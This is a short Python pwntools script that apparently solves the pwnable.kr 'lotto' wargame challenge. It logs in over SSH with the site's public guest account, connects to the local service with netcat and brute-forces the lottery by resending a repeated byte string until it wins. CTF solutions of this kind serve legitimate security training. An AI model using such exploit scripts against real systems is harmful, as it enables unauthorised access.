from pwn import *




s = ssh(user="lotto",host="pwnable.kr",port=2222,password="guest")

sh = s.shell(b"nc 0 10011")

print(sh.recv().decode())

while True: 

    sh.sendline(b"1")
    print(sh.recv().decode())
    sh.sendline(b",,,,,,")
    line = sh.recvlines(2)
    print(line)
    if not b"bad luck" in line[1] : 
        break


